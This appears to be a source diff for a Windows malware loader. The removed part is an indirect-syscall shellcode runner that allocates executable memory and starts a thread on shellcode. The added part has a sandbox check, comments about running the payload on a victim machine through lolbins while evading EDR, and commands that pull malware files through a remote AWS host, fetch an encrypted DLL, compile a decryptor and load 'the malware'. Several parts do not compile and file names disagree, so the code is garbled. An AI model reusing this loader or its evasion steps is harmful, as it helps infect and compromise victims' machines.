@@ -554,8 +554,10 @@ void printResults(SandboxDetector* detector) {
     printf("Detection ratio: %d/%d (%d%%)\n", detectedCount, detector->resultCount, percentage);
 
 }
-
+//none of the malicious code will be within the file it will be generated and compiled on the cloud only to be downloaded and 
+//executed on the victim machine using lolbins and other methods that we will use to evade edr's 
 int main() {
+    //simple sandbox checker from the internet (will add more detection methods for debugging and static analysis)
     printf("Running sandbox detection...\n");
     printf("Please wait while tests are being performed (takes upto 10 seconds)...\n\n");
     SandboxDetector* detector = newSandboxDetector();
@@ -565,48 +567,61 @@ int main() {
     getchar();
     free(detector->results);
     free(detector);
-    PVOID allocBuffer = NULL;  
-    SIZE_T buffSize = 0x1000;  
 
-    HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
 
-    // Declare and initialize a pointer to the NtAllocateVirtualMemory function and get the address of the NtAllocateVirtualMemory function in the ntdll.dll module
-    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
-    // Read the syscall number from the NtAllocateVirtualMemory function in ntdll.dll
-    // This is typically located at the 4th byte of the function
-    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];
+    ask.server_pipeline(malwary.cpp);//calls osher_cohen_poly.py with malwary.cpp the indirect syscall
+    
 
-    // The syscall stub (actual system call instruction) is some bytes further into the function. 
-    // In this case, it's assumed to be 0x12 (18 in decimal) bytes from the start of the function.
-    // So we add 0x12 to the function's address to get the address of the system call instruction.
-    sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;
+    //downloading the decryptor from github into aws machine
+    system("ssh -i /path/to/mykey.pem ec2-user@51.17.183.40 'curl -O https://raw.githubusercontent.com/yonatanasd232132/osherware/main/osher_cohen_poly.py'");//fetching some files
+    system("ssh -i /path/to/mykey.pem ec2-user@51.17.183.40 'curl -O https://raw.githubusercontent.com/yonatanasd232132/osherware/main/malwery.cpp'");//the basic ahh indirect syscall with NO shellcode
+    system("ssh -i /path/to/mykey.pem ec2-user@51.17.183.40 'curl -O https://raw.githubusercontent.com/yonatanasd232132/osherware/main/syscalls.asm'");//so no sus use of native functions
+    system("ssh -i /path/to/mykey.pem ec2-user@51.17.183.40 'curl -O https://raw.githubusercontent.com/yonatanasd232132/osherware/main/syscalls.h'");
+    
+    system("python3 osher_cohen_poly.py");//runs the modifier compiler and encryptor
 
-    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
-    wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
-    sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;
+    system("scp -i /path/to/mykey.pem ec2-user@51.17.183.40:/decryptor.cpp /decryptor.cpp");//fetching decryptor from aws machine
+    system("scp -i /path/to/mykey.pem ec2-user@51.17.183.40:/encrypteddll.enc /encrypteddll.enc");
+    //still need to decrypt ***
 
-    UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
-    wNtCreateThreadEx = ((unsigned char*)(pNtCreateThreadEx + 4))[0];
-    sysAddrNtCreateThreadEx = pNtCreateThreadEx + 0x12;
+    system("g++ -std=c++17 -O2 -shared decryptor.cpp -o decryptor.dll -Wl,--out-implib=libdecryptor.a");//compile the decryptor into dll
 
-    UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");
-    wNtWaitForSingleObject = ((unsigned char*)(pNtWaitForSingleObject + 4))[0];
-    sysAddrNtWaitForSingleObject = pNtWaitForSingleObject + 0x12;
+    if (argc != 3) {
+        std::cerr << "Usage: runner.exe <input_path> <output_path>\n";
+        return 2;
+    }
+    const char* in_path  = "encrypteddll.enc";
+    const char* out_path = "encrptor.dll";
 
-    // Use the NtAllocateVirtualMemory function to allocate memory for the shellcode
-    NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&allocBuffer, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+    // Put decryptor.dll next to runner.exe, or give full path here
+    HMODULE h = LoadLibraryA("decryptor.dll");
+    if (!h) {
+        std::cerr << "Failed to load decryptor.dll. WinErr=" << GetLastError() << "\n";
+        return 3;
+    }
 
-    // Define the shellcode to be injected
-    unsigned char shellcode[] = "\xfc\x48\x83";
+    auto decrypt_file = reinterpret_cast<DecryptFileFn>(GetProcAddress(h, "decrypt_file"));
+    if (!decrypt_file) {
+        std::cerr << "Failed to find symbol 'decrypt_file' in decryptor.dll. WinErr=" << GetLastError() << "\n";
+        FreeLibrary(h);
+        return 4;
+    }
 
-    ULONG bytesWritten;
-    // Use the NtWriteVirtualMemory function to write the shellcode into the allocated memory
-    NtWriteVirtualMemory(GetCurrentProcess(), allocBuffer, shellcode, sizeof(shellcode), &bytesWritten);
+    int rc = 0;
+    try {
+        rc = decrypt_file(in_path, out_path);
+    } catch (...) {
+        std::cerr << "decrypt_file threw an exception.\n";
+        FreeLibrary(h);
+        return 5;
+    }
 
-    HANDLE hThread;
-    // Use the NtCreateThreadEx function to create a new thread that starts executing the shellcode
-    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocBuffer, NULL, FALSE, 0, 0, 0, NULL);
+    HMODULE q = LoadLibraryA("encraptor.dll");//loading the decrypted modified malware as a dll
+    auto decrypt_file = reinterpret_cast<DecryptFileFn>(GetProcAddress(q, "decrypt_file"));
+    rc = decrypt_file();//running the malware
 
-    // Use the NtWaitForSingleObject function to wait for the new thread to finish executing
-    NtWaitForSingleObject(hThread, FALSE, NULL);
+    
+
+    FreeLibrary(h);
+    
 }
